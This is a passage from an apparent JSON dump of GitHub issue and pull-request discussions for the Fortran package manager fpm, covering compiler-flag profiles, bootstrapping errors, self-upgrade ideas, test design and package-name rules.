            "text": "I have a proposed solution to the issue of how we deal with compiler flags.\nI propose adding a section to the fpm.toml file where compiler flags can be specified, with the following schema.\n\nThe top level table is named \"compiler-flags\" (I'm open to suggestions for a better name)\nThere is a table for each compiler. If a table is not specified for a compiler, then only the default/built-in profiles are available\nThere may be multiple tables for each compiler, whose name specifies the name of an available \"profile\"\nA profile table specifies a list of flags, as an array of strings\nA profile table may optionally specify a list of pairs of file and flags to be used for that file\nA profile only applies to a dependency if it does not explicitly override that profile\nSpecifying a profile with the same name as one of the default profiles overrides the default flags for that profile, including for dependencies, unless they also explicitly override that profile\n\nFor example:\n[compiler-flags]\n[compiler-flags.gfortran]\n[compiler-flags.gfortran.only_debug_symbols]\nflags = [\"-g\"]\nfiles = { \"src/special.f90\" = [\"-Wall\", \"-Werror\"] }\nOne can then use a specified profile like fpm build --profile only_debug_symbols. The default/built-in profiles would correspond to our existing modes, and the existing modes would be equivalent to specifying the profile explicitly. I.e. fpm build is equivalent to/implies fpm build --profile debug and fpm build --release is equivalent to/implies fpm build --profile release.\nThis has the following benefits:\n\nA library can override the default flags if they are not appropriate, and have its users respect that\nA project can specify some special profile in a convenient place for frequently used sets of flags\nA project/library need not override compiler flags for every file if only one file needs something special\nWe don't need to come up with and support a coherent set of \"features\" supported by every compiler\n\nI admit that the table structure seems somewhat deeply nested, so I'm open to suggestions of other schemas, but I think this covers everything that needs to be included.\nP.S. If this works out I'd like to suggest an additional built-in profile - strict - that includes all possible compile and run time checking, with all warnings treated as errors. I think this is a very useful option to have, even if not utilized very often.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-02-04 21:31:52+00:00",
                    "text": "Too bad we can't steal a good idea from cargo here, since they never had to deal more than one compiler in their ecosystem. Requiring some deeper nesting in the package manifest seems inevitable for a good Fortran compiler support.\n\n\nThe top level table is named \"compiler-flags\" (I'm open to suggestions for a better name)\n\n\nI would prefer to put the profiles under the build table just to keep the root table clean.\n\n\nThere is a table for each compiler. If a table is not specified for a compiler, then only the default/built-in profiles are available\n\n\nAgreed. Using gfortran instead of gnu or gcc might be preferable for easy mapping between compiler executable name and profile, up to the moment someone is trying to compile with gfortran-9. Not sure what the best solution here would be.\n\n\nThere may be multiple tables for each compiler, whose name specifies the name of an available \"profile\"\n\n\nI made a similar proposal using a table of tables in #112 (comment), after thinking through different format this one seems to be the only feasible choice to support multiple compilers.\n\n\nA profile table specifies a list of flags, as an array of strings\n\n\nHow do you distinguish between compile arguments, link arguments and global arguments here?\n\n\nA profile table may optionally specify a list of pairs of file and flags to be used for that file\n\n\nThis warrants matching rules for file names, like \"src/fragile/**\" = [\"-O1\"] at some point. Not sure if arguments on per file basis should be encouraged by fpm, it will make the package manifest nearly unreadable depending on the complexity of the project.\n\n\nA profile only applies to a dependency if it does not explicitly override that profile\nSpecifying a profile with the same name as one of the default profiles overrides the default flags for that profile, including for dependencies, unless they also explicitly override that profile"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-04 21:35:31+00:00",
                    "text": "How do you distinguish between compile arguments, link arguments and global arguments here?\n\nGood point. I'd suggest instead of having a single flags key, have compile, link, and global keys."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-04 21:38:04+00:00",
                    "text": "This warrants matching rules for file names, like \"src/fragile/**\" = [\"-O1\"] at some point. Not sure if arguments on per file basis should be encouraged by fpm, it will make the package manifest nearly unreadable depending on the complexity of the project.\n\nAgreed. I would prefer not to encourage the use of per file compiler flags, but at some point somebody's going to \"need\" it, so we should have a way to do it."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-09 19:32:08+00:00",
                    "text": "Agreed. Using gfortran instead of gnu or gcc might be preferable for easy mapping between compiler executable name and profile, up to the moment someone is trying to compile with gfortran-9. Not sure what the best solution here would be.\n\nPersonally, the only time I use different versions of the same compiler is to find the oldest compiler version which works. In Linux I can do this easily with update-alternatives.\nI can imagine problems when compiler-flags change meaning or are removed. But if a package required some specific compiler flags to make it work right, there is a high change the package was non-standard to begin with. Ideally the users would bring this up to the package maintainer who could find a workaround."
                },
                {
                    "user": "vmagnin",
                    "date": "2021-02-09 21:04:31+00:00",
                    "text": "Personally, the only time I use different versions of the same compiler is to find the oldest compiler version which works. In Linux I can do this easily with update-alternatives.\n\nPersonally, I have always at least the four last versions of gfortran installed: gfortran is the latest (10), then I have gfortran-9, gfortran-8, gfortran-7, etc. When I have long computations to run, I choose the fastest one! And the latest version is not necessarily the fastest. Sometimes there is some kind of regressions considering the speed when a new major version arrives, and it improves with the following minor versions... Not huge differences but it can be up to 5 to 10%... Not negligible."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-09 21:44:17+00:00",
                    "text": "Same here, I have at least two versions of GCC available on the same system, usually gcc-7 and gcc-10, mainly for regression testing. Also, when working with conda-build the compiler name is usually something like powerpc64le-conda-linux-gnu-gfortran, which is still a gfortran compiler."
                },
                {
                    "user": "brocolis",
                    "date": "2021-03-01 11:57:47+00:00",
                    "text": "I was trying to package the original netlib's QUADPACK as fpm package and was running into this issue: fpm is able to build everything with gfortran-7. But gfortran-10 requires the -fallow-argument-mismatch flag (I had to hardcode this flag into my local branch). All good, now the problem is that gfortran-7 doesn't recognize this flag and stops compiling. Also, I would like to write example programs without this additional flag. So, in this case I think per-compiler flags are welcome."
                },
                {
                    "user": "brocolis",
                    "date": "2021-04-27 13:00:54+00:00",
                    "text": "It would be nice to be able to set flags for a specific operating system. For example, the linker flag -ldl may be required on Linux, and break the build if present on Windows."
                }
            ]
        },
        {
            "number": 349,
            "user": "awvwgk",
            "date": "2021-02-03 22:33:37+00:00",
            "title": "Suggest to move the fpm version in the boostrapping process",
            "text": "Fixes #347",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-02-05 16:55:43+00:00",
                    "text": "Thank you!"
                }
            ]
        },
        {
            "number": 347,
            "user": "vmagnin",
            "date": "2021-02-01 09:40:06+00:00",
            "title": "Bootstrapping: installation of the Fortran fpm version failed",
            "text": "Dear community, this is my first steps with fpm. I have followed the bootstrapping instructions in the README.md file. Everything works fine (fpm test says: \"PASSED: all 109 tests passed\") until the final step:\n~/Fortran/fpm/fpm$ fpm run --runner cp -- ~/.local/bin\ncp: cannot create regular file '/home/vmagnin/.local/bin/fpm': Text file busy\nAs it is the first time I read that error, I have inquired:\nhttps://stackoverflow.com/questions/16764946/what-generates-the-text-file-busy-message-in-unix\nIs it because the fpm file tries to modify itself? (which is the objective of the bootstrap if I have understood...)\nI am working on Linux Kubuntu 20.10.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-02-01 15:00:44+00:00",
                    "text": "Is it because the fpm file tries to modify itself?\n\nThanks for trying it out and reporting this problem @vmagnin. Yes you're right this is because we're trying to replace the Haskell version while it is running; it looks like this is only possible by unlinking the old executable first which doesn't happen with cp(1).\nA possible solution is to update the README to suggest mv(1) instead:\n$ fpm run --runner mv -- ~/.local/bin"
                },
                {
                    "user": "vmagnin",
                    "date": "2021-02-01 17:16:56+00:00",
                    "text": "Thanks @LKedward\nyour suggestion seems to have done the job, since there is no error message, and now when I launch fpm or fpm --help, the message seems longer with more options. I had not noted the previous version, but this is the version I have after bootstrapping:\n~/Fortran/fpm/fpm$ fpm --version\nVersion:     0.1.3, alpha\nProgram:     fpm(1)\nDescription: A Fortran package manager and build system\nHome Page:   https://github.com/fortran-lang/fpm\nLicense:     MIT\nOS Type:     Linux"
                }
            ]
        },
        {
            "number": 346,
            "user": "awvwgk",
            "date": "2021-01-31 14:19:55+00:00",
            "title": "Include root dir in path to default example setup",
            "text": "Minor oversight on my side. Shouldn't have affected any build since examples are only built for the main project.",
            "comments": []
        },
        {
            "number": 345,
            "user": "LKedward",
            "date": "2021-01-29 12:43:12+00:00",
            "title": "Update: fpm_backend with dynamic openmp scheduling",
            "text": "I noticed the parallel compilation time for my stdlib-fpm package was quite poor (on 4 threads) and realised the default static scheduling of threads was causing poor utilisation since compilation times can vary significantly between individual targets. (This is less of a problem for higher core counts)\nThis PR makes dynamic scheduling explicit when using OpenMP for parallel compilation which gives much better utilisation (2x improvement for stdlib-fpm) and avoids implementation-dependent choice of scheduling. We have no pressing need for static scheduling and the overhead for dynamic scheduling appears to be small compared to the time for compilation.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-02-05 16:55:15+00:00",
                    "text": "I'm not familiar with OpenMP but this looks like an improvement and I trust @LKedward and @awvwgk , so I will merge."
                }
            ]
        },
        {
            "number": 344,
            "user": "milancurcic",
            "date": "2021-01-27 20:50:53+00:00",
            "title": "Using fpm to upgrade fpm itself",
            "text": "Say I have fpm-0.1.3 and want to upgrade to current master or some future tag like v0.1.4. After the step 2 of #253 is implemented (so that the fpm.toml is in root dir), I think this should be possible by going through the following steps:\n\nfpm new a dummy project.\nAdd fpm as a dependency to the manifest and specify the v0.1.4 tag.\nRun fpm install. This will build the fpm library and binary as a dependency and put it to ~/.local/bin.\n\nThis will be somewhat awkward and not easy to do. Having the fpm upgrade command do this for you would be useful and nice UX I think.\nWhat do you think?",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 08:05:22+00:00",
                    "text": "This workflow can't work, executables are currently only installed from the root project but not from the dependencies and I don't think it is a good idea to change this behaviour.\nMaybe a more pip like syntax could be desirable here\nfpm install https://github.com/fortran-lang/fpm\n\nThis would clone into a temporary directory, build the project and install into ~/.local/bin."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-28 14:49:18+00:00",
                    "text": "Yes, I didn't suggest that workflow as a solution, but used it as an example of what the user would have to do if it had worked as I thought.\nfpm install https://github.com/fortran-lang/fpm\n\nseems nice to me, though not as easy as fpm upgrade. What do you think about this command being an alias for what you suggested?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 14:54:29+00:00",
                    "text": "fpm upgrade would require a local registry of fpm installed packages to check for all packages that should be updated."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-28 15:02:07+00:00",
                    "text": "Why? What fpm installed packages depend on an fpm binary?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 15:04:45+00:00",
                    "text": "Ah, now I understand, we are talking about a self-upgrade command here. I thought we are talking about a general upgrade strategy and fpm was used as example."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 16:26:43+00:00",
                    "text": "Just as a note, self-upgrading programs are usually not well-received in most packaging ecosystems (except maybe in their own one). The user experience of updating fpm would preferably boil down to pacman -Syu fpm, brew upgrade fpm or mamba update fpm. I'm not sure if fpm has to roll its own self-updating strategy at all."
                },
                {
                    "user": "epagone",
                    "date": "2021-01-28 16:35:56+00:00",
                    "text": "I also add that I think the misunderstanding above suggests one more potential problem: IIRC fpm update updates the dependencies of the project, whereas the proposed fpm upgrade would be an upgrade of fpm itself. This is somehow inconsistent and can confuse the user."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-28 16:46:39+00:00",
                    "text": "self-upgrading programs are usually not well-received in most packaging ecosystems (except maybe in their own one)\n\nThis is no surprise for obvious reasons. I would too recommend that people don't write self-upgrading fpm packages, but to use fpm to do that for them. :)\n\nThe user experience of updating fpm would preferably boil down to pacman -Syu fpm, brew upgrade fpm or mamba update fpm.\n\nIn theory, I think you're right, but in practice it doesn't work. There are so many system-specific package managers that there would be a lot of work for the fpm developers to keep shipping updates on all of them. System-specific managers also have an end-of-life for updates.\nI don't think this is a priority now, but wanted to get a pulse from people. It could also be a plugin (#211) or 3rd party tool, so people like me who want to use it, can."
                },
                {
                    "user": "brocolis",
                    "date": "2021-01-28 19:14:22+00:00",
                    "text": "On Windows there's a problem when trying to upgrade a program that is currently running (already in use Error). On Linux, it should work.\nTentative implementation\nhttps://gist.github.com/brocolis/e2fc06743652f939d95d351b16721f5c"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-24 02:55:07+00:00",
                    "text": "If the Fortran fpm becomes a Fortran fpm package as @LKedward suggests in #362 then you can do\ngit clone https:/fpm_home/fpm.git\ncd fpm\nfpm install\nand if you already have and fpm/ directory just enter it and do\ngit pull\nfpm install\nwhich would just leave the bootstrap issue.\nSo an upgrade does not seem all that cumbersome; even if you do it more cautiously and do a upgrade of the external packages and a build and run the tests before an install. But I would like a simple one-line command to pull a github site with fpm support; build and test and install it and remove the directory.\nAs long as fpm remains a pure Fortran program that is all free-format not using INCLUDE files it is pretty easy to make a single-file fpm.f90 bootstrap file too. Since there are other reasons to make f-fpm an fpm package that seems like that would make it reasonably easy if not quite \"yum install fpm\". The \"other fpm\" purports to be able to make many different package formats, although I have not looked into that too much; but there are already binary fpm distributions available for a number of platforms. The fortran-lang page talking about setting up Fortran should maybe have a link to the fpm setup page? So far fpm is more system-independent than a lot of package managers so using it to package itself does not seem too bad to me."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-24 20:06:38+00:00",
                    "text": "I know of at least one other package manager that has the following behavior, Haskell's stack. If the current working directory is not within an fpm package, then the command fpm install package_name would effectively do what @urbanjost suggested; download the latest version of that package, build it, and install it. If we get around to doing local caching of packages correctly, then there may not be a reason to delete the package once it's installed."
                }
            ]
        },
        {
            "number": 343,
            "user": "awvwgk",
            "date": "2021-01-23 18:18:13+00:00",
            "title": "Fortran fpm help_test invokes fpm",
            "text": "The help_test currently invokes fpm, this usually triggers a complete rebuild of both debug and release version unconditionally.\n\n  \n    \n      fpm/fpm/test/help_test/help_test.f90\n    \n    \n        Lines 21 to 46\n      in\n      c485357\n    \n    \n    \n    \n\n        \n          \n           ! debug version \n        \n\n        \n          \n           'fpm run -- --version                           ',& ! verify fpm version being used \n        \n\n        \n          \n           'fpm run -- --help        > fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help new     >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help update  >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- build --help >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help run     >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help test    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help runner  >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help install >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help list    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help help    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- --version    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           ! release version  \n        \n\n        \n          \n           'fpm run --release -- --version                           ',& ! verify fpm version being used \n        \n\n        \n          \n           'fpm run --release -- --help        > fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help new     >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help update  >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- build --help >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help run     >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help test    >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help runner  >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help install >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help list    >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help help    >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- --version    >> fpm_scratch_help3.txt',& \n        \n    \n  \n\n\nIt might also invoke another version of fpm or completely fail if no fpm is in the PATH.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 03:06:58+00:00",
                    "text": "A lot has changed since it was written, including where a \"run\" only did a build test if the binary was missing, but it was my understandng that each test was run in an environment that was created on demand and included the fpm command. It is running the help on the latest version built by the fpm command. I have not looked recently at a build log but the last time I looked it displayed the expected version number and did not show a build of fpm itself in the log file.  So it has been testing the latest version successfully in the manner expected.  Need a better definition of exactly how the test environment is deployed that the tests run in, but what you describe sounds basically what would be desired if the test environment is set up the way I thought; so need some more details, as I believe those conditions are not supposed to occur for the test environment."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-24 07:30:31+00:00",
                    "text": "You can see a new build starting in the testing environment at https://github.com/fortran-lang/fpm/runs/1754249868?check_suite_focus=true#step:12:2331 in the test step.\nAlso a common case I encountered this was when testing a bootstrapped build with\nfpm run -- test"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 15:15:42+00:00",
                    "text": "It builds the latest version if required and runs the new copy to verify it gets the expected results. It is slower than expected but is doing the intended test. I believe there is an item open to add more actual fpm tests; but testing the actual executable in the CLI and help tests was intentional. I might have misunderstood the exact nature of the test environment?  Is it overwriting something? I thought the test environment was created on the fly specifically to do testing like this. What exactly is damaged?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-24 18:16:43+00:00",
                    "text": "The rebuild appears to be because the test invokes both the debug and --release configurations. In the CI, the --release version is not built prior to running the tests and hence it is built during execution of help_test.\nI would say that the desired behaviour for tests is to test the current build configuration only. i.e. fpm test tests the debug configuration and fpm test --release only tests the --release configuration. The reason for this is that Haskell fpm allows other configurations as specified by --flag and in fact this is what is used in the CI.\nThe --release version is not directly built at all by the CI since the release version used for binaries is specified explicitly with --flag in order to get static executables:\n\n  \n    \n      fpm/.github/workflows/CI.yml\n    \n    \n         Line 36\n      in\n      c485357\n    \n    \n    \n    \n\n        \n          \n           RELEASE_FLAGS: --flag --static --flag -g --flag -fbacktrace --flag -O3 \n        \n    \n  \n\n\nHence this test is not actually running at all for the binary release version specified in our CI.\nThis problem is related to #328 in terms of a test needing information about its context. A possible solution suggested by Brad is to provide environment variables for the build output directory, however this does rely on some specification of the output file structure which has thus far been avoided.\nIt is worth noting also that cli_test solves a similar problem by providing an alternate entry point within the test executable instead of invoking the main fpm executable.."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 20:10:47+00:00",
                    "text": "I made the cli_test version before discussions about just what the test environment was. During development of the  help_test I made inquiries about whether fpm could be called and at the time that apparently was considered OK. I was under the impression the test environment was a virtual platform created on demand for the tests and had the f-fpm command in it's path.\nSo exactly what is the test platform? Unit tests etc. are satisfactory for testing procedures and objects (I have used such tests before they had a name) but at some point if you are building an application you want to test the application, both test and production versions; especially since I do not even have several of the environments available that the tests run on.  So what is the best way to call the latest version of the program fpm from a test? Even if not done for fpm itself an environment variable giving a path to a built version would seem reasonable. I\nPS:\nI am particularly surprised the test environment even has h-fpm in it; I have been using f-fpm for months on different platforms just bootstrapping it on machines with just gfortran and git."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-25 09:57:13+00:00",
                    "text": "Yes you're right @urbanjost, we do need a way of testing the application end-to-end in addition to unit tests. As you're aware we have previously found bugs with the CLI this way. The issue for discussion is what is the best way to call the executable from a test. For the reasons I mentioned I don't think calling fpm run from within the test is the best option. (The problem isn't with the test environment.)\nSince we don't have support for the required path environment variables currently (needs discussion/specification), do you think you would be able to test the same functionality by invoking the test executable like the cli_test?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-01-25 16:32:19+00:00",
                    "text": "I think that fpm needs a facility for integration/end-2-end testing.\n\nTests are specified for a given executable.\nTests are run in an isolated directory\nIt must be possible to specify\na. the runner (i.e. equivalent to fpm run --runner)\nb. command line arguments (i.e. equivalent to fpm run --args)\nc. Any inputs which should be copied into the isolated directory\nd. A way (optionally) of checking the \"screen\" outputs\ne. A way (optionally) of checking output files\n\nGiven that we would like to at least encourage these test be portable (i.e. work for any environment that fpm supports), d and e imply some sort of fpm specific scripting language. Or maybe fpm could carry around a Bash implementation to run these scripts?\nWhat do you guys think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-25 16:41:50+00:00",
                    "text": "That would be a great addition, with 1, 2, 3a-c the important functionality. 3d and 3e could possibly be implemented outside of fpm by a package used as dev-dependency or by a combination of --runner and --args for a test. A related issue on this is #179."
                }
            ]
        },
        {
            "number": 342,
            "user": "awvwgk",
            "date": "2021-01-23 14:28:43+00:00",
            "title": "Fix broken link in contributing guidelines",
            "text": "Closes #340",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-01-23 15:04:39+00:00",
                    "text": "CI passes after rerunning so not sure if there's some non-determinism (?) in the tests. Think it was the 'help_test' that failed. (This test is actually a little problematic since it invokes fpm run to run Fortran fpm, but this doesn't test the release flags properly.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-23 18:28:41+00:00",
                    "text": "Think it was the 'help_test' that failed. (This test is actually a little problematic since it invokes fpm run to run Fortran fpm, but this doesn't test the release flags properly.)\n\nI opened #343 to discuss this."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-30 13:07:02+00:00",
                    "text": "Since this is a simple change, I'll go ahead and merge."
                }
            ]
        },
        {
            "number": 341,
            "user": "MarkWieczorek",
            "date": "2021-01-21 15:25:51+00:00",
            "title": "build script=\"make all\" no longer works",
            "text": "About a year ago, I was able to compile of complex project of mine using a pre-existing Makefile. After finding out about the environment variables $BUILD_DIR and $FC, this was pretty easy, I only needed to specify the following:\n[library]\nbuild-script = \"make all F95=$FC LIBPATH=$BUILD_DIR MODPATH=$BUILD_DIR\"\n\nHowever, I just updated to the latest alpha version (0.1.3), and this does't seem to work anymore: the makefile is not being executed and instead fpm is trying to compile the file in the src directory.\nIs there a way to specify using a prexisting makefile, or a way pass optional variables to the Makefile?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-01-21 15:41:30+00:00",
                    "text": "Are you using the Haskell (fpm-haskell-0.1.3*) or Fortran (fpm-0.1.3*) client? This is not yet implemented in the latter."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-21 15:42:07+00:00",
                    "text": "Hello @MarkWieczorek,\nnote the build-script was an \"experimental\" feature available in the bootstrap fpm (the Haskell version). In the meantime a Fortran version of fpm has been built. You can check the manifest reference to see what is available.\nExecutables for the Haskell version can be found in the assets section of the latest release.\nA specification for the build-script feature is currently under discussion in #249."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2021-01-21 15:50:33+00:00",
                    "text": "I'm using the Fortran client. Should the Haskell version be the default? or is the plan to make the Fortran version the default?\nSo, I am guessing the answer is: Check back later\nThat's fine with me. However, I just want to emphasize that if you want old, or complicated projects to work with fpm, eventually, you will need to pass environment variables to the makefile!"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-21 15:53:14+00:00",
                    "text": "The Fortran version is (and will remain) the default. The build script is just one of the features which hasn't been implemented yet in the Fortran version."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-22 10:01:23+00:00",
                    "text": "Thanks for the feedback @MarkWieczorek. Support for a custom build script is one of two (big) priority items remaining in our milestone . I'll close this issue as a duplicate of #219."
                }
            ]
        },
        {
            "number": 340,
            "user": "ivan-pi",
            "date": "2021-01-21 10:22:01+00:00",
            "title": "Link in contributing guide is broken",
            "text": "You can learn how from this great tutorial.\n\nThe link at the end of the contributing is broken. The correct address is:\nhttps://app.egghead.io/courses/how-to-contribute-to-an-open-source-project-on-github",
            "comments": []
        },
        {
            "number": 337,
            "user": "milancurcic",
            "date": "2021-01-12 22:20:53+00:00",
            "title": "Allow hyphens in fpm project names in \"fpm new\"",
            "text": "fpm new currently requires a package name to be a valid Fortran name.\n$ fpm new test-new\n<ERROR>the new directory basename must be an allowed                    \n       Fortran name. It must be composed of 1 to 63 ASCII               \n       characters and start with a letter and be composed               \n       entirely of alphanumeric characters [a-zA-Z0-9]                  \n       and underscores.                                                 \nSTOP 4\n\nTo have a hyphen in a package name is rather common though. For example, we have stdlib-cmake-example, there's toml-f and others, and I enjoy using hyphens as well.\nThis PR removes the restriction to use hyphens in new fpm package names in fpm new. The function that I used to do that (to_fortran_name()) can be easily expanded to other special characters if a need arises.\nIf you try this PR, you should get:\n$ ./fpm new test-new\n + mkdir -p test-new\n + cd test-new\n + mkdir -p test-new/src\n + mkdir -p test-new/test\n + mkdir -p test-new/app\n + git init test-new\nInitialized empty Git repository in /your/path/to/fpm/build/gfortran_debug/app/test-new/.git/\n\n$ cd test-new\n$ head fpm.toml \nname = \"test-new\"\nversion = \"0.1.0\"\nlicense = \"license\"\nauthor = \"Jane Doe\"\nmaintainer = \"jane.doe@example.com\"\ncopyright = \"2021 Jane Doe\"\n\n\n[library]\nsource-dir=\"src\"\n\n$ cat src/test-new.f90 \nmodule test_new\n  implicit none\n  private\n\n  public :: say_hello\ncontains\n  subroutine say_hello\n    print *, \"Hello, test-new!\"\n  end subroutine say_hello\nend module test_new\n\nI also updated the error message that you get if you pass some other special character:\n$ ./fpm new test^new\n<ERROR> the fpm project name must be made of up to 63 ASCII letters,    \n        numbers, underscores, or hyphens, and start with a letter.      \nSTOP 4\n\nWe can discuss at a later time if there are some other special characters that we'd want to allow.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-01-13 01:32:29+00:00",
                    "text": "Forcing the directory, package, and module name to be the same and to be an allowable Fortran module name was a deliberate decision. Obviously, the module name must conform to these rules, and it was considered that the simplest solution was to enforce them all being consistent.  This disallows such options as the package and directory name being UTF-8 and so on so it is defnitely restrictive. I do not know if the discussions are still available, but now that there is auto-discovery it is far less of an issue. The question I have is should there be an option to name the package and the module independently instead of making a special case where dashes are replaced with underscores?  If we are going to relax the restriction I think it would be better to leave the default behavior as-is and allow for an optional parameter to name the directory and project. I do not know if UTF-8 or other characters are allowed or easily supported in all the places the name might appear, but I believe toml-f supports UTF-8.  So if we allowed any arbitrary name would it cause issues with git, github, gitlab, the fpm repository and/or toml files ?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-13 08:16:47+00:00",
                    "text": "I agree that we might have to enforce some restrictions on the project name (e.g. I would consider newlines always invalid), but requiring it to be a valid Fortran identifier seems harsh. Allowing more freedom in fpm-new is very welcome from my side (in fact all my fpm packages but one are using hyphens in the project name).\nI like the idea to just underscorify everything we can't use in Fortran, in case we encounter problems with the names of the targets, archive, directories a similar approach could be used as well. The limitations of the programming language shouldn't be imposed on the user in my opinion.\nAlso, cargo allows a --name option in the new subcommand to specify the project name independently from the project directory. For our case this doesn't solve the issue with the name of the module but I would consider this a placeholder anyway, so chances are good that it will be renamed."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-13 08:53:37+00:00",
                    "text": "Thanks @milancurcic, I too use hyphens commonly in package names and welcome this change. The proposed solution of replacing with underscores where needed seems reasonable.\nWith that said, I think the relevant discussion that drives the current behaviour is #153 (Prevent Name Collisions Between Packages) where it was agreed that all module names should be prefixed by the package name. This check is not yet implemented in fpm; when implemented, there will be a small burden on users to ensure modules are correctly prefixed by the fortranised package name. Alternatively, the module namespace prefix could be specified in the manifest separately."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-01-13 09:03:03+00:00",
                    "text": "As an aside: we should be thinking about the support for UTF-8. That is a\nrather tricky topic, as it may well depend on what the compilers allow\n(think of file names).\n\nNote: My remark is not to complicate matters for fpm, just to remind us of\nthe topic in general.\n\nOp wo 13 jan. 2021 om 09:53 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Thanks @milancurcic <https://github.com/milancurcic>, I too use hyphens\n commonly in package names and welcome this change. The proposed solution of\n replacing with underscores where needed seems reasonable.\n\n With that said, I think the relevant discussion that drives the current\n behaviour is #153 <#153>\n (Prevent Name Collisions Between Packages) where it was agreed that all\n module names should be prefixed by the package name. This check is not yet\n implemented in *fpm*; when implemented, there will be a small burden on\n users to ensure modules are correctly prefixed by the fortranised package\n name. Alternatively, the module namespace prefix could be specified in the\n manifest separately.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#337 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7SCYPKAPV6PIIPXCDSZVNSDANCNFSM4V74FQJQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-13 09:05:29+00:00",
                    "text": "For UTF-8 support I will link to the upstream issue at TOML-Fortran (toml-f/toml-f#3) as this will become relevant."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-13 17:17:46+00:00",
                    "text": "With this PR, I didn't mean to ignore #153, which I still think is important. But I forgot about it in the moment.\nWhen fpm checks that all module names do begin with the project name, the change in this PR will require an extra clause explaining the restriction to the user. For example:\n\nFpm requires that the names of all modules in your package begin with the package name. If your package name contains hyphens (-), the module names should have underscores (_) in place of hyphens.\n\nor similar. So there is a bit of burden that is being put on the user with this. On the other side, with this PR fpm new already generates correct module names with underscores instead of hyphens. Further, when the #153 check is implemented, fpm will be able to tell the user exactly how to prefix the module names. For example, if package name is \"my-fortran-lib\", fpm can report something like:\n<ERROR> All module names in this package must begin with \"my_fortran_lib\"."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-14 01:11:15+00:00",
                    "text": "Even now nothing obvious breaks if the directory is renamed, as I have done myself several times so I would prefer a second parameter for naming the directory to a non-default value, but at least for now this is satisfactory for the specific case of a dash.\nI can picture where the user might want the entire directory name to be a UTF8 string which could produce a project name of something like  \"___\" so in the long term I think this will need revisited,  but during the original discussion I think the conclusion was something along the lines \"of a consistent name is simplest and most intuitive, let us go with the restriction and revisit if if there are complaints\", which, lo and behold is the case so lets go with this as it covers the most common case and appears to be commonly desired.  If there are requests for other changes I think the additional option would be cleaner, but this has been the only request so far.\nI believe it is telling that other package managers appear to address this with an additional option, but apparently in the reverse order of precedence I would suggest (the name always names the directory and an alternate project name is allowed for).  After trying it that might be better, as it allows for things like fpm . --backfill.  So in the future if the name on \"new\" allows for any name, but if it is required you supply a \"Fortran-acceptable\" name  as well as the primary project name if the directory name is not one I would go with that.\nfpm new ANY_DIRECTORY_NAME --name 